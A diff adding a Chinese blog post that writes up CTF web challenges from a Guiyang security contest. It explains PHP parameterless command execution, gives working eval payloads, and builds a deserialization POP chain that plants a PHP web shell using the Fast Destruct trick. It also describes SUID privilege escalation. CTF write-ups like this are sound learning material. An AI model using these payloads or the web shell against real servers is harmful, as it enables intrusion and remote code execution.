@@ -1,0 +1,461 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[大数据及网络安全精英对抗赛]赛后总结 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[大数据及网络安全精英对抗赛]赛后总结 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="挨打总结，记一些知识点。
+无参数命令执行
+例题：[GXYCTF2019]禁止套娃
+先用GitHack拿到源码：
+&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;b..." />
+    <meta name="keywords" content="赛后总结,命令执行,反序列化,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [大数据及网络安全精英对抗赛]赛后总结
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-05-01
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/QGeg3Wbqm/" class="post-tag">
+                  # 赛后总结
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/x1DzYssV5/" class="post-tag">
+                  # 命令执行
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VdmrICFMJ/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/sai-hou-xiao-jie-da-shu-ju-ji-wang-luo-an-quan-jing-ying-dui-kang-sai.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>挨打总结，记一些知识点。</p>
+<h1 id="无参数命令执行">无参数命令执行</h1>
+<h2 id="例题gxyctf2019禁止套娃">例题：[GXYCTF2019]禁止套娃</h2>
+<p>先用GitHack拿到源码：</p>
+<pre><code class="language-php">&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die(&quot;还差一点哦！&quot;);
+            }
+        }
+        else{
+            die(&quot;再好好想想！&quot;);
+        }
+    }
+    else{
+        die(&quot;还想读flag，臭弟弟！&quot;);
+    }
+}
+</code></pre>
+<p>无参数命令执行的标志就是<code>eval</code>执行的输入参数，在传入<code>eval </code>之前经过了像这样一个正则判断：</p>
+<pre><code class="language-php">if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']))
+</code></pre>
+<p><code>?R</code>是递归匹配的写法。这里匹配的是一串小写字母或下划线接一对中括号，中括号里要么没东西，不然也得是一串小写字母或下划线接一对中括号形式的字符串：</p>
+<pre><code>func1('123')    // 无法匹配
+func1(func2()func3())   // 无法匹配
+func1(func2(func3()))   // 可以匹配
+</code></pre>
+<p>因此，这里要执行命令就只能用函数嵌套起来的字符串。</p>
+<h2 id="攻击思路">攻击思路</h2>
+<h3 id="函数嵌套读取文件">函数嵌套读取文件</h3>
+<p>先贴一些函数：</p>
+<pre><code>getchwd() 函数返回当前工作目录。
+scandir() 函数返回指定目录中的文件和目录的数组。
+dirname() 函数返回路径中的目录部分。
+chdir() 函数改变当前的目录。
+readfile() 输出一个文件。
+current() 返回数组中的当前单元, 默认取第一个值。
+pos() current() 的别名。
+next() 函数将内部指针指向数组中的下一个元素，并输出。
+end() 将内部指针指向数组中的最后一个元素，并输出。
+array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+array_slice() 函数在数组中根据条件取出一段值，并返回。
+array_reverse() 函数返回翻转顺序的数组。
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin() — 转换十六进制字符串为二进制字符串。
+getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。
+localeconv() 函数返回一包含本地数字及货币格式信息的数组。
+highlight_file() 语法高亮一个文件
+</code></pre>
+<p>针对这道题，因为需要读取同级目录下的<code>flag.php</code>，比较容易想到的就是想办法获取到字符串<code>flag.php</code>，然后用函数读。</p>
+<p>这里主要使用返回一些有可用信息数组和返回数组中元素内容的函数。payload为：<code>highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p>
+<h3 id="getallheaders在请求头中插入执行代码">getallheaders()在请求头中插入执行代码</h3>
+<p><code>getallheaders</code>可获取全部 HTTP 请求头信息，返回的是一个数组。</p>
+<p><code>implode</code>用字符串连接数组元素，返回一个字符串。</p>
+<pre><code class="language-php">&lt;?php
+echo implode(getallheaders());
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1682994660304.png" alt="" loading="lazy"></figure>
+<p>注意到这里请求头信息的输出是按顺序的。在请求头开始处插入额外的字段，在其中写入要执行的命令。先测试代码如下：</p>
+<pre><code class="language-php">&lt;?php
+$cmd = 'eval(implode(getallheaders()));';     // 模拟传入的payload，eval用来执行请求头中插入的代码
+eval($cmd);
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1682995433418.png" alt="" loading="lazy"></figure>
+<h3 id="get_defined_vars在get参数中插入执行代码">get_defined_vars()在GET参数中插入执行代码</h3>
+<p><code>get_defined_vars</code>返回由返回多维数组。包含调用 get_defined_vars() 作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</p>
+<p>和上面在请求头中把执行的代码取出，<code>get_defined_vars</code>则是把执行的代码从GET请求参数中取出。</p>
+<pre><code class="language-php">&lt;?php
+var_dump(get_defined_vars());
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1683009873114.png" alt="" loading="lazy"></figure>
+<p>构造的payload的为：<code>/?cmd=eval(end(current(get_defined_vars())));&amp;shell=system('ls');</code>，这个思路和上一种方法基本一样，便不再赘述了。测试如下：</p>
+<pre><code class="language-php">&lt;?php
+eval($_GET['cmd']);
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/1683010619262.png" alt="" loading="lazy"></figure>
+<h3 id="session_id在phpsessionid中插入执行代码">session_id()在phpsessionid中插入执行代码</h3>
+<p>和上面一样，思路都是把参数从检查的变量外带进去。利用phpsessionid也就不难想到了。相关函数：</p>
+<ul>
+<li><code>session_start()</code>: 创建新会话或者重用现有会话</li>
+<li><code>session_id() </code>: 获取/设置当前会话 ID</li>
+</ul>
+<p>payload可以构造为：<code>eval(hex2bin(session_id(session_start())));</code>。先通过<code>session_start()</code>开启会话；然后用<code>session_id() </code>获取session ID，也就是Cookie中的<code>PHPSESSID</code>字段；因为<code>PHPSESSID</code>仅允许出现<code>a-z A-Z 0-9 , （逗号）和 - （减号）</code>字符，所以只有输入十六进制字符串，再使用<code>hex2bin</code>进行转换；最后，用<code>eval</code>执行代码。</p>
+<p>测试，这里的<code>73797374656d28276c7327293b</code>就是<code>system('ls')</code>的十六进制编码：<br>
+<img src="https://skyblu3519.github.io/post-images/1683119459198.png" alt="" loading="lazy"></p>
+<h2 id="贵阳大数据及网络安全精英对抗赛may_be">[贵阳大数据及网络安全精英对抗赛]May_be</h2>
+<p>很明显的无参数命令执行，过滤了一些东西，可以使用上面提到的<code>get_defined_vars</code>利用。</p>
+<p>命令执行找到flag文件，读取的时候发现权限不够。使用<code>find / -perm -u=s -type f</code>发现<code>cp</code>有SUID权限，通过反弹shell再提权就可以读到flag。SUID提权详见：<a href="https://blog.csdn.net/CP1024/article/details/123952966">Linux提权之SUID提权</a></p>
+<p>但这里也可以用<code>cp</code>把flag文件复制到一个当前权限可读的文件上，内容被覆盖的文件权限不会改变，这样也可以读到flag的内容。</p>
+<h1 id="php反序列化之fast-destruct">PHP反序列化之Fast Destruct</h1>
+<h2 id="贵阳大数据及网络安全精英对抗赛pop">[贵阳大数据及网络安全精英对抗赛]POP</h2>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+class TT{
+    public $key;
+    public $c;
+    public function __destruct(){
+        echo $this-&gt;key;
+    }
+
+    public function __toString(){
+        return &quot;welcome&quot;;
+    }
+}
+
+class JJ{
+    public $obj;
+    public function __toString(){
+        ($this -&gt; obj)();
+        return &quot;1&quot;;
+    }
+    public function evil($c){
+        eval($c);
+    }
+    public function __sleep(){
+        phpinfo();
+    }
+}
+
+class MM{
+    public $name;
+    public $c;
+    public function __invoke(){
+        ($this-&gt;name)($this-&gt;c);
+    }
+    public function __toString(){
+        return &quot;ok,but wrong&quot;;
+    }
+    public function __call($a, $b){
+        echo &quot;Hacker!&quot;;
+    }
+}
+$s = $_GET['s'];
+$a = unserialize($s);
+throw new Error(&quot;NoNoNo&quot;);
+</code></pre>
+<p>这个pop链还是比较好构造的，入口只有<code>TT</code>中的<code>__destruct</code>，另外要在类中像<code>($this-&gt;name)($this-&gt;c)</code>调用函数，要使用<code>array(new JJ, 'evil');</code>这样类+类中方法名的数组写法：</p>
+<pre><code class="language-php">&lt;?php
+class TT{
+    public $key;
+    public $c;
+}
+
+class JJ{
+    public $obj;
+}
+
+class MM{
+    public $name;
+    public $c;
+}
+$T = new TT();
+$J = new JJ();
+$M = new MM();
+$jj = new JJ();  // 创建一个JJ类的实例
+
+$M-&gt;name = array($jj, 'evil');  // 将方法存储在变量中
+$M-&gt;c = 'file_put_contents(&quot;sky.php&quot;,\'&lt;?php eval($_POST[sky]);?&gt;\');';
+$J-&gt;obj = $M;
+$T-&gt;key = $J;
+echo serialize($T);
+</code></pre>
+<p>输出序列化字符串：</p>
+<pre><code>O:2:&quot;TT&quot;:2:{s:3:&quot;key&quot;;O:2:&quot;JJ&quot;:1:{s:3:&quot;obj&quot;;O:2:&quot;MM&quot;:2:{s:4:&quot;name&quot;;a:2:{i:0;O:2:&quot;JJ&quot;:1:{s:3:&quot;obj&quot;;N;}i:1;s:4:&quot;evil&quot;;}s:1:&quot;c&quot;;s:58:&quot;file_put_contents(&quot;sky.php&quot;,'&lt;?php eval($_POST[sky]);?&gt;');&quot;;}}s:1:&quot;c&quot;;N;}
+</code></pre>
+<p>但是直接提交这个是不行的。因为<code>__destruct</code>只有在程序正常执行结束后才能触发，而在题目中用了一个异常抛出中断了正常的结束，因此也就无法触发<code>__destruct</code>。</p>
+<h2 id="fast-destruct">Fast Destruct</h2>
+<p>目的是在执行<code>serialize</code>时就直接触发<code>__destruct</code>，用到的方式是破坏序列化字符串的方法。简单举个例子：</p>
+<pre><code class="language-php">&lt;?php
+// 序列化字符串来源
+class B {
+}
+
+class A {
+    public $b;
+    public function __construct()
+    {
+        $this-&gt;b = new B;
+    }
+}
+$a = new A;
+echo serialize($a);
+
+// 测试序列化
+class B {
+    public function __call($f,$p) {
+        echo &quot;B::__call($f,$p)\n&quot;;
+    }
+    public function __destruct() {
+        echo &quot;B::__destruct\n&quot;;
+    }
+    public function __wakeup() {
+        echo &quot;B::__wakeup\n&quot;;
+    }
+}
+
+class A {
+    public function __destruct() {
+        echo &quot;A::__destruct\n&quot;;
+        $this-&gt;b-&gt;c();
+    }
+}
+
+$s = 'O:1:&quot;A&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;B&quot;:0:{}}';
+unserialize($s);
+</code></pre>
+<p>正常的序列化结果：</p>
+<pre><code>B::__wakeup
+A::__destruct
+B::__call(c,Array)
+B::__destruct
+</code></pre>
+<p>破坏序列化字符串：</p>
+<pre><code>O:1:&quot;A&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;B&quot;:0:{}}    // 正常字符串
+O:1:&quot;A&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;B&quot;:0:{};}   // 添加;
+O:1:&quot;A&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;B&quot;:0:{}     // 删除}
+O:1:&quot;A&quot;:2:{s:1:&quot;b&quot;;O:1:&quot;B&quot;:0:{}}    //  修改A的属性数量
+</code></pre>
+<p>破坏导致<code>serialize</code>执行异常，提前销毁触发<code>__destruct</code>：</p>
+<pre><code>A::__destruct
+B::__call(c,Array)
+B::__wakeup
+B::__destruct
+</code></pre>
+<p>可以看到<code>__destruct</code>的执行被提前了。详细的原理之后有机会再理解了，这里摘一段“<a href="https://www.jianshu.com/p/38606134fdd6">提前触发__destruct函数绕过检测</a>”里面的内容:</p>
+<blockquote>
+<p>获取反序列化字符串–&gt;根据类型进行反序列化—&gt;查表找到对应的反序列化类–&gt;根据字符串判断元素个数–&gt;new出新实例–&gt;迭代解析化剩下的字符串–&gt;判断是否具有魔法函数__wakeup并标记—&gt;释放空间并判断是否具有具有标记—&gt;开启调用。</p>
+<p>根据上面的流程，我们可以发现，这个过程中是逐步对对象做解析的，而且解析过程中会同时去根据相应的魔法函数标记去调用魔法函数，所以说，即使完整的反序列化最终失败了，但在这个过程中涉及到的对象仍然是可以正常出发魔法函数的调用的。Fast destruct的目的就是让完整的反序列化失败，再利用unserialize运行失败后会对运行中已经创建出来类进行销毁这一特性，去提前触发对应类中的__destruct函数。</p>
+</blockquote>
+<h1 id="exec-命令执行">exec 命令执行</h1>
+<h2 id="贵阳大数据及网络安全精英对抗赛notrce">[贵阳大数据及网络安全精英对抗赛]notrce</h2>
+<p>命令执行，过滤了一些函数找好替代就行。</p>
+<p>因为PHP的<code>exec</code>执行命令并不会返回执行结果，但可以把执行结果输出到文件中。参考命令：<code>command | tee /path/to/output.txt</code></p>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/1683126734392.png" alt="" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>这次做出来的题目中学到东西就这些了，继续加油吧～</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">无参数命令执行</a>
+<ul>
+<li><a href="#%E4%BE%8B%E9%A2%98gxyctf2019%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">例题：[GXYCTF2019]禁止套娃</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">攻击思路</a>
+<ul>
+<li><a href="#%E5%87%BD%E6%95%B0%E5%B5%8C%E5%A5%97%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">函数嵌套读取文件</a></li>
+<li><a href="#getallheaders%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%B8%AD%E6%8F%92%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81">getallheaders()在请求头中插入执行代码</a></li>
+<li><a href="#get_defined_vars%E5%9C%A8get%E5%8F%82%E6%95%B0%E4%B8%AD%E6%8F%92%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81">get_defined_vars()在GET参数中插入执行代码</a></li>
+<li><a href="#session_id%E5%9C%A8phpsessionid%E4%B8%AD%E6%8F%92%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81">session_id()在phpsessionid中插入执行代码</a></li>
+</ul>
+</li>
+<li><a href="#%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9Bmay_be">[贵阳大数据及网络安全精英对抗赛]May_be</a></li>
+</ul>
+</li>
+<li><a href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfast-destruct">PHP反序列化之Fast Destruct</a>
+<ul>
+<li><a href="#%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9Bpop">[贵阳大数据及网络安全精英对抗赛]POP</a></li>
+<li><a href="#fast-destruct">Fast Destruct</a></li>
+</ul>
+</li>
+<li><a href="#exec-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">exec 命令执行</a>
+<ul>
+<li><a href="#%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9Bnotrce">[贵阳大数据及网络安全精英对抗赛]notrce</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/shua-ti-bi-ji-escapeshellarg-escapeshellcmd-ming-ling-zhi-xing/">
+              <h3 class="post-title">
+                刷题笔记：escapeshellarg + escapeshellcmd 命令执行
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
